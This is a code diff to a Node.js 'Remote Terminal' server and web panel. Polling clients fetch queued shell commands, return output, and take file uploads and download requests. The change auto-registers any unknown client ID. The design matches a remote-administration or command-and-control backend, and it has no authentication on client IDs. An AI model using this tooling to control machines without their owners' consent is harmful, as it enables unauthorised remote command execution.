@@ -23,12 +23,39 @@ const selectedExclude = new Set();
 const DISCONNECT_THRESHOLD = 10000;
 
 // ---------- Helper ----------
-function getClientStatus(client) {
-  if (!client.lastSeen) return 'unknown';
+function getClientStatus(clientId) {
+  const client = clients.get(clientId);
+  if (!client || !client.lastSeen) return 'unknown';
   return Date.now() - client.lastSeen > DISCONNECT_THRESHOLD ? 'disconnected' : 'connected';
 }
 
-// ---------- Embedded HTML ----------
+/**
+ * Ensure a client exists for the given ID.
+ * If it doesn't, create it with default state.
+ */
+function ensureClient(clientId) {
+  if (!clientId) return null;
+  if (clients.has(clientId)) {
+    return clients.get(clientId);
+  }
+  // Auto-register this client
+  const newClient = {
+    cwd: '/',
+    env: {},
+    tasks: [],
+    lastTaskId: 0,
+    connected: true,
+    pendingDownload: null,
+    lastSeen: Date.now(),
+    registered: true   // flag to know it was auto-registered
+  };
+  clients.set(clientId, newClient);
+  clientHistory.set(clientId, []);
+  console.log(`[AUTO-REGISTER] Client ${clientId} re-registered after restart`);
+  return newClient;
+}
+
+// ---------- Embedded HTML (unchanged) ----------
 const html = `<!DOCTYPE html>
 <html>
 <head>
@@ -270,45 +297,17 @@ const html = `<!DOCTYPE html>
       try {
         const res = await fetch('/clients');
         const data = await res.json();
-        // For each client, check if we already have a line for its ID in the terminal.
-        // We'll store the mapping from client ID to the line element (or its index).
-        // A simple approach: clear all lines and rebuild from history?
-        // But we want to keep history. Instead, we'll append new lines for new client states.
-        // But the user wants a scrolling history of all command outputs, not just client status.
-        // Actually we want to show a history of commands and responses.
-        // However, the server only returns the latest output per client.
-        // To get history, we'd need the server to return the full history.
-        // But the server already maintains clientHistory per client with timestamps.
-        // We can fetch that and display it.
-        // But for simplicity, we'll just append new client updates as they come.
-        // But we need to avoid duplicate lines if a client updates multiple times.
-        // Instead, we can clear terminal and rebuild from history if we have it.
-        // Let's fetch the full history from the server? 
-        // The current server sends only the last output. We could change the server to send the full history for each client.
-        // But the user wants a scrollable terminal like a real terminal.
-        // The simplest fix: when we fetch clients, clear the terminal and rebuild from the history array.
-        // But we don't have the full history in the response. We only have the last output per client.
-        // To fix properly, we need to store the full log in the server and send it to the UI.
-        // Let's modify the server to include the history in /clients.
-        // But we can also just append updates without clearing, and let the terminal grow.
-        // The issue is that every time we fetch, we append new lines, causing duplicates.
-        // We can keep a set of seen outputs per client and only append when output changes.
-        // Let's implement that: store lastOutput per client and only append when it changes.
-
-        // We'll store last known output per client id in a Map.
         if (!window.lastKnownOutputs) window.lastKnownOutputs = new Map();
 
         for (const client of data.clients) {
           const last = window.lastKnownOutputs.get(client.id);
           const current = client.output || '';
           if (last !== current) {
-            // Append new line
             const cls = client.output && client.output.toLowerCase().includes('error') ? 'error' : '';
             appendLine(client, cls);
             window.lastKnownOutputs.set(client.id, current);
           }
         }
-        // Also update title
         if (data.clients.length > 0 && data.clients[0].cwd) {
           document.title = 'Remote Terminal - ' + data.clients[0].cwd;
         }
@@ -328,7 +327,6 @@ const html = `<!DOCTYPE html>
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-        // Add a command line to terminal (without checkbox)
         const cmdWrapper = document.createElement('div');
         cmdWrapper.className = 'output command';
         const cmdText = document.createElement('div');
@@ -470,41 +468,49 @@ const html = `<!DOCTYPE html>
     // Init
     document.querySelectorAll('.lineCheckbox').forEach(cb => { cb.disabled = true; });
     updateSelectedList();
-    // Initial fetch
     fetchClients();
-    // Poll every 2 seconds to reduce noise
     setInterval(fetchClients, 2000);
   </script>
 </body>
 </html>`;
 
-// ---------- Routes (order matters) ----------
+// ---------- Routes ----------
 app.get('/', (req, res) => res.send(html));
 app.get('/master', (req, res) => res.send(html));
 
 // ---------- API routes ----------
+
+// Register – still generates a new UUID (client may call this on first start)
 app.post('/register', (req, res) => {
   const clientId = uuidv4();
-  clients.set(clientId, {
-    cwd: '/',
-    env: {},
-    tasks: [],
-    lastTaskId: 0,
-    connected: true,
-    pendingDownload: null,
-    lastSeen: Date.now()
-  });
-  clientHistory.set(clientId, []);
+  // If client already exists (should not happen with new UUID), we overwrite? Better to ensure it doesn't exist.
+  if (!clients.has(clientId)) {
+    clients.set(clientId, {
+      cwd: '/',
+      env: {},
+      tasks: [],
+      lastTaskId: 0,
+      connected: true,
+      pendingDownload: null,
+      lastSeen: Date.now()
+    });
+    clientHistory.set(clientId, []);
+  }
   res.json({ clientId });
 });
 
+// Poll – auto‑register if unknown clientId
 app.get('/poll', (req, res) => {
   const clientId = req.query.clientId;
-  if (!clientId || !clients.has(clientId)) {
+  if (!clientId) {
+    return res.status(400).json({ error: 'Missing clientId' });
+  }
+  const client = ensureClient(clientId);
+  if (!client) {
     return res.status(400).json({ error: 'Invalid client' });
   }
-  const client = clients.get(clientId);
   client.lastSeen = Date.now();
+
   let task = null;
   if (client.tasks && client.tasks.length > 0) {
     task = client.tasks.shift();
@@ -515,13 +521,18 @@ app.get('/poll', (req, res) => {
   res.json({ task: task || null });
 });
 
+// Result – auto‑register if unknown clientId
 app.post('/result', (req, res) => {
   const { clientId, taskId, output, fileData } = req.body;
-  if (!clientId || !clients.has(clientId)) {
+  if (!clientId) {
+    return res.status(400).json({ error: 'Missing clientId' });
+  }
+  const client = ensureClient(clientId);
+  if (!client) {
     return res.status(400).json({ error: 'Invalid client' });
   }
-  const client = clients.get(clientId);
   client.lastSeen = Date.now();
+
   if (taskId && taskId > client.lastTaskId) {
     client.lastTaskId = taskId;
   }
@@ -540,12 +551,13 @@ app.post('/result', (req, res) => {
   res.json({ ok: true });
 });
 
+// Clients list – includes auto‑registered ones
 app.get('/clients', (req, res) => {
   const list = [];
   for (const [id, client] of clients) {
     const history = clientHistory.get(id) || [];
     const lastOutput = history.length > 0 ? history[history.length - 1].output : '';
-    const status = getClientStatus(client);
+    const status = getClientStatus(id);
     list.push({
       id,
       output: lastOutput,
@@ -556,6 +568,7 @@ app.get('/clients', (req, res) => {
   res.json({ clients: list });
 });
 
+// Command – targets may include clients that are not yet registered, but we'll just skip them
 app.post('/command', (req, res) => {
   const { cmd, targets } = req.body;
   if (!cmd) return res.status(400).json({ error: 'No command' });
@@ -570,6 +583,7 @@ app.post('/command', (req, res) => {
   res.json({ ok: true });
 });
 
+// Upload – similarly, skip unknown clients
 app.post('/upload', upload.single('file'), (req, res) => {
   const file = req.file;
   if (!file) return res.status(400).json({ error: 'No file' });
@@ -587,6 +601,7 @@ app.post('/upload', upload.single('file'), (req, res) => {
   res.json({ ok: true });
 });
 
+// Download request – skip unknown
 app.post('/download-request', (req, res) => {
   const { path: remotePath, targets } = req.body;
   if (!remotePath) return res.status(400).json({ error: 'No path' });
